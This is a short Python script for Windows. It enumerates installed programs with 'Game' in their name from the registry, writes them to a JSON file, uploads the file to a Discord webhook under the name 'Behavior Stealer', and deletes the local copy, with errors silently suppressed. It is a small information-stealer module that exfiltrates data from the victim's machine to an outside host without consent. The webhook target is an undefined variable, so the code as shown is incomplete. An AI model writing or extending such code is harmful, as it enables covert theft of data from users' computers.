import requests
import os
import json
import winreg


def get_installed_games():
    games = {}
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ)
        for i in range(winreg.QueryInfoKey(registry_key)[0]):
            try:
                key_name = winreg.EnumKey(registry_key, i)
                sub_key = winreg.OpenKey(registry_key, key_name)
                display_name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
                install_location = winreg.QueryValueEx(sub_key, "InstallLocation")[0]
                if "Game" in display_name:
                    games[display_name] = install_location
            except EnvironmentError:
                continue
    except Exception:
        pass
    return games

def send_games_to_webhook():
    games = get_installed_games()
    with open("games.json", "w", encoding="utf-8") as f:
        json.dump(games, f, indent=4)
    
    with open("games.json", "rb") as f:
        files = {"file": ("games.json", f)}
        data = {
            "content": "🎮 **Installed Games List**",
            "username": "Behavior Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"
        }
        try:
            requests.post(Behavior, files=files, data=data)
        except Exception:
            pass

    os.remove("games.json")

send_games_to_webhook()
